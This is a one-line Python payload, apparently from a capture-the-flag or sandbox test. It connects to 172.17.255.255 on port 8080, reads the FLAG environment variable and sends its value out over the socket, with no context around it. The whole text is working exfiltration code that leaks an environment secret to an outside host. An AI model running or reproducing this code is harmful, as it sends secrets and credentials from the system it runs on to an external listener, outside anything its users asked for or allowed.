
import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('172.17.255.255', 8080));import os;s.send("HERE{}".format(os.environ.get("FLAG")));data = s.recv(1024)
